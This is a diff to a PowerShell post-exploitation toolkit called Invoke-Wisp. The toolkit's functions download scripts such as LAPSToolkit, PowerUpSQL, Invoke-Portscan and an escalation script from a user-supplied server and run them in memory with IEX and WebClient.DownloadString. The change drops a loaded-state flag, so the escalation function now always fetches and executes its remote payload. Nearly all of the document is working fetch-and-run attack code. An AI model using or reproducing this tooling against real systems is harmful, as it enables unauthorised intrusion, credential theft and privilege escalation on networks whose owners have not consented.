@@ -2,7 +2,6 @@
     CREATED BY KARMAZ
 #>
 $global:url_1029384756=$null
-$global:memory_loaded_1029384756=0
 
 function Invoke-Wisp {
     [Parameter(Mandatory, HelpMessage = "Please provide a server url address using -url 'http://<your_server>/'")]
@@ -39,7 +38,6 @@ function Memory_Load {
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/LAPSToolkit.txt")
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/PowerUpSQL.txt")
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/Invoke-Portscan.txt")
-    $global:memory_loaded_1029384756=1
 }
 
 function Escalation {
@@ -50,12 +48,7 @@ function Escalation {
         Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
         return
     }
-    if($memory_loaded_1029384756 -eq 1){
-        IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/escalate.txt")
-    }else{
-        memory_load
-        escalation
-    }
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/escalate.txt")
 }
 
 function fortification {
